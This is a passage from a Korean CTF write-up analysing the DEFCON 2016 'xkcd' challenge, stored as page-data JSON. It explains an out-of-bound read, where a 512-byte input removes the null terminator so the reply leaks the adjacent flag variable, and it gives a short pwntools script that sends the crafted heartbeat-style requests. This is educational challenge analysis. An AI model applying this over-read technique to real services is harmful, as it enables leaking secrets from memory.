version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>공격</h2>\n<ul>\n<li>어떻게 해당 flag 문자열 값을 읽어올 수 있을까?</li>\n<li><code class=\"language-text\">globals</code>, <code class=\"language-text\">flag</code> 전역 변수는 같은 .bss 섹션에 존재하며 <code class=\"language-text\">globals</code> 변수를 기준으로 0x200 바이트 차이가 난다.</li>\n<li>만약에 사용자가 0x200 바이트 이상의 값을 입력하게 된다면 해당 값은 <code class=\"language-text\">flag</code> 전역 변수와 붙게 될 것이고 널값이 존재 하지 않게되 <code class=\"language-text\">streln</code> 은 해당 길이 검사를 할때 널 값을 확인할 수 없어 <code class=\"language-text\">flag</code> 변수의 널 까지 읽게 되어 <code class=\"language-text\">globals+flag</code> 길이를 측적하게 될 것이다.</li>\n<li>그렇게 되면 <code class=\"language-text\">out-of-bound read</code> 취약점이 발생할 것이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ne <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./xkcd\"</span><span class=\"token punctuation\">)</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./xkcd\"</span><span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> <span class=\"token string\">'SERVER, ARE YOU STILL THERE? IF SO, REPLY \"%s\" (%d)'</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">512</span><span class=\"token punctuation\">,</span> <span class=\"token number\">512</span><span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>    \n    <span class=\"token keyword\">print</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 708px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0UlEQVQY03XM207DIAAAUH7EtetoC4VRLuXSAqOsasyyh2lisvis0fj/H2D8AJLzfEDIVxcu1r+4eFH2EdGZ60x4GNWq3FPTT/tOlYDllKY56CUYH5mcmh5jxjtyxIwTLqu238GuBPh01ksyPtmYhVkOiA7j1FE+jIoKXbe4gqgE+LRpvxqfbfxfIGKE654KwvVR2rolFRxKgIuzckY5oxcnrW56iBltB4QZoYLt4P7hUJeA7fk35q90/l63n5A+B/bGpzsT71zdpf7A9BWRW8kfe2ZCKeUkNAgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/b547b166c5b8f537383938fe8538dfef/3cb0f/8.png\"\n        srcset=\"/static/b547b166c5b8f537383938fe8538dfef/e9ff0/8.png 180w,\n/static/b547b166c5b8f537383938fe8538dfef/f21e7/8.png 360w,\n/static/b547b166c5b8f537383938fe8538dfef/3cb0f/8.png 708w\"\n        sizes=\"(max-width: 708px) 100vw, 708px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"flag\" style=\"position:relative;\"><a href=\"#flag\" aria-label=\"flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>flag</h2>\n<ul>\n<li>flag를 획득할 수 있다.</li>\n</ul>","frontmatter":{"date":"September 18, 2020","title":"DEFCON 2016 xkcd 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🧻"},"fields":{"slug":"/defcon2016_xkcd_ctf_writeup/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/csaw_small_boi_ctf_writeup/","nextSlug":"/csaw_popping_ctf_writeup/","prevSlug":"/defcon2016_xkcd_ctf_writeup/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}